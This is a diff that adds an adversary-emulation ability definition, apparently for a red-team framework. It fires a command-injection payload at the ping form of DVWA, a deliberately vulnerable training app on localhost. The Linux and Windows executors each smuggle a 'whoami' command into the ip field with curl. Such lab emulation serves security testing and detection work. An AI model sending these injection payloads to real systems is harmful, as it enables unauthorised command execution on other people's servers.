@@ -1,0 +1,30 @@
+- id: a1b2c3d4-dvwa-0003-cmdi-000000000003
+  name: DVWA - Command Injection Probe (Low)
+  description: Injects command payload into DVWA Ping endpoint
+  tactic: execution
+  technique_id: T1059.004
+  technique_name: "Command and Scripting Interpreter: Unix Shell"
+  repeatable: false
+  executors:
+    - name: sh
+      platform: linux
+      command: |
+        DVWA_URL="${DVWA_URL:-http://127.0.0.1:80/dvwa}"
+        COOKIE_FILE="/tmp/dvwa_cookie.txt"
+        curl -s -b "$COOKIE_FILE" -b "security=low" \
+          -d "ip=127.0.0.1%3B+whoami&Submit=Submit" \
+          "$DVWA_URL/vulnerabilities/exec/" > /dev/null || true
+        echo "[+] Dispatched Command Injection payload"
+        exit 0
+      timeout: 30
+    - name: psh
+      platform: windows
+      command: |
+        $DvwaUrl = if ($env:DVWA_URL) { $env:DVWA_URL } else { "http://127.0.0.1:80/dvwa" }
+        $CookieFile = "$env:TEMP\dvwa_cookie.txt"
+        curl.exe -s -b "$CookieFile" -b "security=low" `
+          -d "ip=127.0.0.1%26%26whoami&Submit=Submit" `
+          "$DvwaUrl/vulnerabilities/exec/" | Out-Null
+        Write-Output "[+] Dispatched Command Injection payload"
+        exit 0
+      timeout: 30
